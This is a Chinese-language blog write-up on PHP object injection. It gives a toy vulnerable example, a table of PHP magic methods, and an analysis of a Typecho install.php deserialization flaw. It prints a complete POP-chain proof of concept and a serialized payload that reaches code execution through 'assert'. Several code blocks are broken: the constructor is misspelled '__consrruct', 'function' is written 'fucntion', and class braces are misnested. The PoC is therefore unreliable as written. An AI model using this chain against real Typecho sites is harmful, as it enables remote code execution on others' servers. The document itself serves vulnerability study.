---
layout: post
title: PHP object injection analyse
date: 2018-12-29
categories: blog
description: 
---



## PHP object injetion

### 0x01 PHP反序列化漏洞
- 序列化漏洞产生事例 

~~~php
<?php
    class a{
    		public $handle;
    		
    		function __destruct(){
    		$this->shutdown();
    		}
    		
    		public function shutdown(){
    		$this->handle->close();
    		}
    }
    	
    class b{
			public $pid;
			function close(){
			eval($this->pid);
			}    
    $userdata = unserialize(urldecode($_GET['data']));
    }
?>
~~~
这段代码包含两个类，一个a和一个b，在b中有一个成员函数close(),其中有一个eval()函数，但是其参数不可控，我们无法利用它执行任意代码。但是在a类中有一个__destruct()析构函数，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。于是开始思考这样一个问题：能否让他去调用process中的close()函数且$pid变量可控呢？答案是可以的，只要在反序列化的时候$handle是process的一个类对象，$pid是想要执行的任意代码代码即可，看一下如何构造POC:

~~~php
<?php
	 class a {
	 	public $handle;
	 	function __construct(){
	 		$this->handle = new b;
	 	}
	 	
	 class b {
	 	public $pid;
	 	function __construct(){
	 		$this->pid = 'phpinfo();';
	 	} 
	 	
	 $test = new a();
	 echo urlencode(serialize($test));
	 
	 }
	 
	 }

?>
~~~

- 魔术方法 
 
魔术方法|详情
------------- | -------------
\_\_sleep()|[serialize()](http://php.net/manual/zh/function.serialize.php) 函数会检查类中是否存在一个魔术方法 \_\_sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。
\_\_wakeup()|[unserialize()](http://php.net/manual/zh/function.unserialize.php) 会检查是否存在一个 \_\_wakeup() 方法。如果存在，则会先调用 \_\_wakeup 方法，预先准备对象需要的资源。\_\_wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。
\_\_toString()|\_\_toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。
\_\_invoke()|当尝试以调用函数的方式调用一个对象时，\_\_invoke() 方法会被自动调用。
\_\_set_state()|自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。本方法的唯一参数是一个数组，其中包含按 array('property' => value, ...) 格式排列的类属性。
\_\_debuginfo()|This method is called by var_dump() when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown.
\_\_get()|读取不可访问属性的值时，\_\_get() 会被调用。
\_\_set()|在给不可访问属性赋值时，\_\_set() 会被调用。
isset()&\_\_isset&empty()|当对不可访问属性调用 isset() 或 empty() 时，\_\_isset() 会被调用。
unset()&\_\_unset()|当对不可访问属性调用 unset() 时，__unset() 会被调用。
\_\_call()|在对象中调用一个不可访问方法时，__call() 会被调用。
\_\_callStatic()|在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。
\_\_construct()|PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。

### 0x02 实战讲解 (Typecho漏洞分析)
#### 前期准备
本次复现漏洞时下载的为Typecho最新版本（1.2）所以需稍稍修改install.php才能成功复现。  
需修改处：注释43和44行，让代码能够执行下去。

![修改](/img/2018-12-29-php-unserialize_img/pass.png)

漏洞入口点如下：

![漏洞入口](/img/2018-12-29-php-unserialize_img/entry.png)

cookie中的\_\_typecho_config值取出，然后base64解码再进行反序列化，这就满足了漏洞发生的第一个条件：存在序列化字符串的输入点。接下来就是去找一下有什么magic方法可以利用。  
搜素上述的魔术方法，发现/vars/Typecho/db.php下有\_\_construct魔术方法：

![Construct](/img/2018-12-29-php-unserialize_img/typechodb.png)  

使用.运算符连接\$adapterName，这时\$adapterName如果是一个实例化的对象就会自动调用\_\_toString方法。  
然后搜索下\_\_toString方法，发现/var/Typecho/Feed.php下的\_\_toString方法可以利用.

![tostring](/img/2018-12-29-php-unserialize_img/tostring.png) 
 
如果\$item['author']中存储的类没有‘screenName’属性或者该属性为私有，会出发该类中的\_\_get(screenName)魔法方法。  
进一步跟踪\_\_get()方法，发现在/var/Typecho/Request.php下有可利用的点：
\_\_get调用get()，get()调用\_applyFilter,重点看\_applyFilter。

![applyFilter](/img/2018-12-29-php-unserialize_img/applyFilter.png)

发现我们想要得到的call\_user\_func()函数。查看下$filter,和$value都来自类变量。
$filter来自private $\_filter, $value来自private \$\_params。

#### POP chain 构造
- 构造Typecho_request类

~~~php
	  class Typecho_Request{
			private $_params = array();
			private $_filter = array();
			
			public function __consrruct()
			{
				$this->_params['screenName'] = 'phpinfo()';
				$this->_filter[0] = 'assert';
			}

			}
~~~
- 构造Typecho_Feed类

~~~php

	  class Typecho_Feed{
	  		private $_type;
	  		private $_items = array();
	  		public fucntion __construct()
	  		{
	  			$this->_type = 'Rss 2.0';
	  			$item['author'] = new Typecho_Request();
	  			$item['category'] = Array(new Typecho_Request());
	  			$this->_items[0] = $item;
	  		
	  		}
	  
	  }

~~~

- POC

~~~
	  class Typecho_Request{
			private $_params = array();
			private $_filter = array();
			
			public function __consrruct()
			{
				$this->_params['screenName'] = 'phpinfo()';
				$this->_filter[0] = 'assert';
			}

			}
			
	class Typecho_Feed{
	  		private $_type;
	  		private $_items = array();
	  		public fucntion __construct()
	  		{
	  			$this->_type = 'Rss 2.0';
	  			$item['author'] = new Typecho_Request();
	  			$item['category'] = Array(new Typecho_Request());
	  			$this->_items[0] = $item;
	  		
	  		}
	  
	  }
	  
	  $exp = array('adapter' => new Typecho_Feed());
	  
	  echo urlencode(base64_encode(serialize($exp)));

~~~

### 0x03 POP chain 分析

- 入侵分析：

1. install.php

	~~~
	$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
...
$installDb = new Typecho_Db($adapter, _r('dbPrefix')); //1.2版本入口点
	~~~
	发现 unserialize 并且参数可控 Typecho_Cookie::get('\_\_typecho\_config')， 然后将 $adapter 作为 Typecho\_Db 类的初始化变量创建类实例。

2. /vars/Typecho/db.php

   寻找魔术方法，发现上述文件中 $adapterName = 'Typecho\_Db\_Adapter\_' . $adapterName; 存在拼接，且为实例化对象，默认会调用\_\_toString()魔法方法。


3. /var/Typecho/Feed.php

	上述文件中有\_\_toString()方法。

	如果\$item['author']中存储的类没有‘screenName’属性或者该属性为私有，会触发该类中的\_\_get(screenName)魔法方法。  


4. /var/Typecho/Request.php

	\_\_get()方法中含有代码执行的方法。
	
4. 序列化后的内容：
   ```
   a:1:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:20:"Typecho_Feed_items";a:1:{i:0;a:2:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:9:"phpinfo()";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}s:8:"category";a:1:{i:0;O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:9:"phpinfo()";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}}}}s:19:"Typecho_Feed_type";s:7:"RSS 2.0";}}/
```


### Reference
\[1\]: https://www.freebuf.com/column/161798.html

\[2\]: https://php.net
